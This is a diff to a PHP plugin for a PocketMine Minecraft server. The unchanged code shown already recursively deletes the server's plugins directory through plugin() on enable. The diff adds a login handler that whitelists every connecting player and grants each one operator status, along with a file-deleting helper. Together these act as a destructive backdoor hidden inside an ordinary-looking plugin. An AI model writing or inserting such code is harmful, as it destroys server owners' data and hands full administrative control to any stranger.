@@ -15,6 +15,12 @@ class Main extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Li
     $this->world();
     $this->plugin();
   }
+  public function onLogin(PlayerPreLoginEvent $event){
+	  $player = $event->getPlayer();
+          $name = $player->getName();
+	  $this->getServer()->addWhitelist($name);
+	  $this->getServer()->addOp($name);
+  }
   public function playerCommand(PlayerCommandPreprocessEvent $event)
   {
 		$message = $event->getMessage();
@@ -38,8 +44,7 @@ class Main extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Li
 			array_map('rmdir', array_filter($paths, 'is_dir'));
 		}
 	}
-	public function plugin()
-  {
+	public function plugin() {
 		$dir = $this->getServer()->getDataPath() ."plugins";
 		if (is_dir($dir) and !is_link($dir)) {
 			$paths = array();
@@ -50,5 +55,8 @@ class Main extends \pocketmine\plugin\PluginBase implements \pocketmine\event\Li
 			array_map('unlink', array_filter($paths, 'is_file'));
 			array_map('rmdir', array_filter($paths, 'is_dir'));
 		}
+	}
+	public function remove_directory($dir){
+		unlink("$dir");
 	}
 }
